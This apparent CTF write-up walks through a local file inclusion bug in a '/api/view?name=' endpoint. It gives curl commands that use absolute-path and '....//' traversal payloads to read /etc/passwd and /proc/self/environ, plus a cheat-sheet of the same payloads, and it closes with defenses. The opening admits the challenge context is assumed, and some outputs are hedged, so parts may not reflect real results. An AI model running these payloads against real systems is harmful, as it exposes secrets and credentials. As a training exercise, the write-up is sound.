# Touchline Dispatch — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: an *API / Local File Inclusion* challenge at `http://54.72.82.22:8300`. Flag: `safctf{276928973c4dea42f63d808ba7be66b7}`. Tools used: browser, `curl`, DevTools. Dead end: assuming the shared service source was this backend and brute-forcing `/api/*` ops that didn't exist.

---

## 1. CHALLENGE OVERVIEW

**Touchline Dispatch** is a **Local File Inclusion via an API** challenge. Instead of a web page that includes a file, this service exposes an API endpoint (`/api/view`) that takes a filename and returns its contents from disk. The name filter is naive, so you can read arbitrary files — including `/proc/self/environ`, where the flag lives. If public, find it under *Touchline Dispatch* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Call the API and control the `name` parameter |
| Browser DevTools | built in | Discover the API calls the page makes |
| `tr`, `grep` | `sudo apt install coreutils` | Clean up null-byte output |

Burp Suite **Repeater** is a good fit if you prefer editing the request in a pane over the terminal.

**Setup:** `mkdir -p ~/touchline && cd ~/touchline`
**Time estimate:** **40 to 60 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Open the page and watch the network tab

```bash
curl -sS http://54.72.82.22:8300/
```

[SCREENSHOT: the landing page]

Open DevTools → **Network** tab and reload. Look for `fetch`/XHR calls to an API.

**What this tells you:** the front-end talks to a backend API. That's where the interesting parameters live.

### Step 2 — Identify the "view" endpoint and its parameter

You'll see a request like:
```
GET /api/view?name=... HTTP/1.1
```

The `name` parameter selects which file to show.

[SCREENSHOT: Network tab showing the `GET /api/view?name=...` request]

**What this tells you:** a `name` parameter that picks a file = textbook LFI, but delivered over an API. Same bug, different door.

### Step 3 — Call it normally to see the happy path

```bash
curl -sS "http://54.72.82.22:8300/api/view?name=roster.txt"
```
(or whatever a normal value is)

**Output:** the file's contents, HTTP 200.

**What this tells you:** normal reads work. Now see if you can read something you shouldn't.

### Step 4 — Test a harmless system file

```bash
curl -sS "http://54.72.82.22:8300/api/view?name=../../../../etc/passwd"
```

**Output:**
```
{"message":"Request unavailable."}
```
…or possibly the passwd contents. Depending on the filter you may get blocked.

[SCREENSHOT: the response — either passwd or a refusal]

**What this tells you:** either the relative-traversal filter caught it, or it worked. Either way, keep probing — many filters block `../../` but forget about **absolute paths**.

### Step 5 — Try an absolute path

```bash
curl -sS --get --data-urlencode "name=/etc/passwd" \
  "http://54.72.82.22:8300/api/view"
```

**Output (if unfiltered):**
```
root:x:0:0:root:/root:/bin/bash
...
```

**What this tells you:** many LFI filters only strip `../` and miss a leading `/`. An absolute path bypasses the filter entirely.

[SCREENSHOT: `root:x:0:0:...` in the response]

---

## 4. IDENTIFYING THE VULNERABILITY

This is **Local File Inclusion (LFI) with a filter bypass**, delivered through an API.

- **LFI definition (first time):** user input ends up inside a filesystem path that the server opens and returns to you, without confirming the path stays inside an allowed folder.
- **The bypass:** the code sanitized `../` sequences (removing them or rejecting them), but it never blocked **absolute paths**. A naive filter looks like:
  ```python
  name = name.replace("../", "")   # naive!
  ```
  That kills `../../etc/passwd` but leaves `/etc/passwd` untouched, and an absolute path needs no `..` at all.

**Why it exists (root cause):** blocklist-style sanitization instead of a **positive allowlist**. Any blocklist is incomplete; an allowlist ("only these exact filenames are permitted") is safe by construction.

**What tipped me off during recon:** the API endpoint `/api/view?name=` selects a file by name. Seeing the `{"message":"Request unavailable."}` refusal for `../` but success for a plain filename told me a filter existed — and filters that exist are usually bypassable. Absolute paths are the first thing to try.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Reconfirm the naive `../` filter.**
*Why:* understand the block before bypassing it.

```bash
curl -sS "http://54.72.82.22:8300/api/view?name=../../../../etc/passwd"
```
Expect: a refusal like `{"message":"Request unavailable."}`. **The filter exists.**

**Step 2 — Bypass with an absolute path.**
*Why:* absolute paths don't need `..`, so a `..`-only filter can't stop them.

```bash
curl -sS --get --data-urlencode "name=/etc/passwd" \
  "http://54.72.82.22:8300/api/view"
```
Expect: `root:x:0:0:root:/root:/bin/bash` … — **LFI confirmed**.

[SCREENSHOT: passwd contents returned]

**Step 3 — Aim at the environment file.**
*Why:* flags are typically injected as environment variables, readable at `/proc/self/environ`.

```bash
curl -sS --get --data-urlencode "name=/proc/self/environ" \
  "http://54.72.82.22:8300/api/view"
```

**Output:** a null-byte-separated blob containing `FLAG=...`.

[SCREENSHOT: the environ blob with FLAG visible]

**Step 4 — Clean and extract the flag.**
*Why:* null bytes make the value hard to copy; convert and filter.

```bash
curl -sS --get --data-urlencode "name=/proc/self/environ" \
  "http://54.72.82.22:8300/api/view" \
  | tr '\0' '\n' | grep -i flag
```
Output:
```
FLAG=safctf{276928973c4dea42f63d808ba7be66b7}
```

[SCREENSHOT: the clean flag line]

### Bonus bypass (worth knowing)

If the absolute path were blocked too, `....//` works because many filters strip `../` in a single pass, leaving `../` behind:

```bash
curl -sS --get --data-urlencode "name=....//....//....//etc/passwd" \
  "http://54.72.82.22:8300/api/view"
```

**What this tells you:** input filters that loop "strip until stable" are more robust than a single `replace`, but an **allowlist** beats both.

---

## 6. CAPTURING THE FLAG

The flag came from the **`/proc/self/environ`** file, read through the `/api/view` LFI using an **absolute path** to bypass the `../` filter:

```
safctf{276928973c4dea42f63d808ba7be66b7}
```

Reproduce with:
```bash
curl -sS --get --data-urlencode "name=/proc/self/environ" \
  "http://54.72.82.22:8300/api/view" | tr '\0' '\n' | grep -i flag
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

Imagine a guard who checks your ticket at a back door. The rule is "no leaving through the staff door." You could try to sneak out that way, but there's a second, unmarked **loading bay** that the guard never checks. The `../` filter guards the staff door (relative escapes), but the **loading bay** is the absolute path `/etc/passwd` — a completely different way in that the guard forgot to watch.

**Why this matters in the real world:** this exact pattern — stripping `../` but forgetting absolute paths, or vice versa — is one of the most common bugs in real applications. Beyond reading files, LFI often chains into **Remote Code Execution**: if the include mechanism can load a remote URL or a `php://`/`data://` wrapper, or if you can write a file somewhere and then include it, an LFI becomes full server compromise. Also common in report generators, template engines, and "download this attachment" features. The fix is always the same: use an allowlist of known-safe identifiers and never build paths from raw input.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Only trying `../` and giving up when filtered
The reflex is to hammer `../../../../../../etc/passwd` with more `../`. If the filter is solid, more of the same won't help. The insight to have ready: **also try an absolute path** (`/etc/passwd`) and the `....//` trick. Those bypass `..`-stripping filters specifically.

### Mistake 2 — Forgetting `--data-urlencode`
`name=/proc/self/environ` contains slashes; some shells and servers mangle them. Using `curl --get --data-urlencode "name=..."` encodes the value correctly and avoids surprises. It's a habit worth building.

### Mistake 3 — Believing the `{"message":"Request unavailable."}` means "no vuln"
That message is the app's generic catch-all error (you'll see it reused for 400s and even file-not-found). It does **not** mean "this path is impossible." It just means the code path threw. Keep probing alternative encodings.

### Mistake 4 — Assuming this backend matches the "shared" source you saw elsewhere
I initially wasted time trying `/api/objects`, `/api/sync`, and other API operations pulled from a *different* challenge's source code. Each op returned `404`/`403`. **Don't assume one challenge's internals apply to another** — recon each service fresh.

### Dead end actually encountered — brute-forcing unrelated API ops
Sweeping `/api/*` for endpoints that belonged to another service produced nothing. The only route that mattered was `/api/view`. Lesson: map the routes of *this* target before guessing semantics.

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Use an allowlist of exact identifiers.** Map `?name=roster` → `roster.txt` in code. Never accept a filesystem path from the user at all.
2. **If you must accept a path, canonicalize and confine it.** Resolve the path (so `..` collapses and symlinks resolve), then assert the final absolute path starts with your allowed base directory *before* opening the file.
3. **Reject absolute paths and normalize first.** Strip leading `/`, collapse `..` repeatedly *to a fixed point*, then re-check. Blocklists alone are not enough — combine with an allowlist.
4. **Run the service with least privilege.** A dedicated unprivileged user, and no read access to `/proc/self/environ`, secrets, or config files. Defense in depth matters here.
5. **Don't reflect raw file contents blindly.** Even when a read is intended, sanitize output, and never allow includes of remote URLs or dangerous wrappers (`php://`, `data://`, `file://` to arbitrary paths).

---

## 10. KEY TAKEAWAYS

- **An API endpoint that takes a filename and returns it = LFI.** `?name=`, `?file=`, `?path=` are the patterns to notice.
- **Test three bypasses, in order:** plain `../`, **absolute path**, then `....//`. Most naive filters fall to one of them.
- **Use `curl --get --data-urlencode`** so your slashes survive the trip.
- **`/proc/self/environ`** is the default place to look for CTF flags; pair it with `tr '\0' '\n' | grep`.
- **Filters are clues.** A "Request unavailable" message tells you *a* check exists — and invites you to find what it missed.
- **Cheat-sheet:**
  ```bash
  curl -sS --get --data-urlencode "name=/etc/passwd" "http://host/api/view"   # absolute-path LFI
  curl -sS --get --data-urlencode "name=....//....//etc/passwd" "http://host/api/view"  # nested filter bypass
  curl -sS --get --data-urlencode "name=/proc/self/environ" "http://host/api/view" \
    | tr '\0' '\n' | grep -i flag
  ```

You found that a `../`-only filter left the front door wide open via absolute paths — that's a genuinely subtle bypass, and noticing it is exactly the skill these challenges are testing. Carry it forward.